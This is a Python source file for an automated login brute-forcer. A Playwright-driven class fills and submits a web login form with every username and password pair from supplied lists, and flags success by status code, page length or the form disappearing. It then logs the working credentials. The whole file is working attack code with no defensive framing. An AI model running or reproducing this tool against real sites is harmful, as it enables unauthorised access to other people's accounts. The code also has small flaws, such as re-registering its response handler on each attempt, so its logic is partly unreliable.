import logging
import sys
import webParser
import requests
import time
from bs4 import BeautifulSoup
import ssl
from html_similarity import style_similarity, structural_similarity, similarity
from lxml import html
from playwright.async_api import async_playwright 

class headless:
    def __init__(self, url, web_parser,  pass_user) -> None:
        self.url = url
        self.web_parser = web_parser
        self.pass_user = pass_user
        
        
    async def brute(self) -> None:
        """
        sends all combinations for usernames and passwords to the attack function on the login page
        """
        p = await async_playwright().start()
    
        browser = await p.firefox.launch(headless=False)
        page = await browser.new_page()
        await page.goto(self.url)

        await page.wait_for_selector(self.web_parser.button_attr)
        
        
        for username in self.pass_user['Usernames']:
            for password in self.pass_user['Passwords']:
                page.on('response', lambda response: self.getResponse(response))

                content = await self.attack(username, password, page)
                await page.wait_for_event('response')
                if self.check_login(content):
                    logging.info("login successfull\n\nusername: "+ username+ "\npassword: "+ password)
                    await browser.close()
                    await p.stop()  
                    sys.exit()     
                await page.goto(self.url)
                await page.wait_for_selector(self.web_parser.button_attr)
        await browser.close()
        await p.stop()
        

        
    async def attack(self, username, password, page):
        """
        create a packet containing fake headers and the payload(username,password) and submit it to the server
        """
        self.status_code = []
        await page.fill('input[name=' + self.web_parser.user_param +']', username)
        await page.fill('input[name=' +  self.web_parser.password_param +']', password)

        await page.locator(self.web_parser.button_attr).click()

        content = await page.content()
        return content


    def getResponse(self, response):
        self.status_code= response.status
        
        
        
    def check_login(self, content):
        """
        checks if login was successful by checking if status code changed and checks if form is still in the page
        """
        if self.status_code >= 400:
            return False

        elif self.status_code != self.web_parser.status_code:
            print(str(self.status_code))
            print(str(self.web_parser.status_code))
            return True
        
        elif ((abs(len(content) - self.web_parser.contentLen) / self.web_parser.contentLen) * 100.0) >= 20:
            return True
        
        parser = BeautifulSoup(content, 'html.parser')
        forms = parser.find_all('form')
        if self.web_parser.form not in forms:
            return True

        return False


    ########################################################################################

